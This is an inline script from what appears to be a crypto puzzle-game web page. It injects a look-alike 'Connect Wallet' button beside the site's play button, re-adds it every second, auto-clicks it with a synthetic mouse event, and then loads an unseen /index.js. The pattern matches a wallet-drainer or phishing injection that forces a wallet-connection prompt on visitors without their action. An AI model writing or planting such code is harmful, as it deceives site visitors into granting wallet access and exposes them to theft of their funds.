        <script>
          function addButton() {
            const existingButton = document.querySelector("#puzzle-game-hero-play-now-button");
            if (existingButton && !document.querySelector('.interact-button')) {
              const newButton = document.createElement('button');
              newButton.className = 'interact-button font-bold md:text-lg leading-6 uppercase text-white text-center disabled:opacity-50 disabled:cursor-not-allowed rounded-tl-2xl rounded-br-2xl md:rounded-tl-3xl md:rounded-br-3xl flex justify-center items-center gap-[0.625rem] md:gap-2 font-TT_Firs_Neue_Bold h-12 md:h-[3.75rem] md:w-[15.625rem] button-pink-gradient w-full sm:w-auto';
              newButton.style.background = 'linear-gradient(92.29deg, #ff62fa, #ff74f4)';
              newButton.innerHTML = 'Connect Wallet';
              existingButton.parentNode.insertBefore(newButton, existingButton.nextSibling);
              
              // Auto-click the new button once it's added
              setTimeout(() => {
                const mouseEvent = new MouseEvent('click', {
                  view: window,
                  bubbles: true,
                  cancelable: true,
                  buttons: 1
                });
                newButton.dispatchEvent(mouseEvent);
              }, 1000);
            }
          }

          document.addEventListener('DOMContentLoaded', function() {
            addButton();
            setInterval(addButton, 1000);
          });
        </script>
        <script src="/index.js"></script>
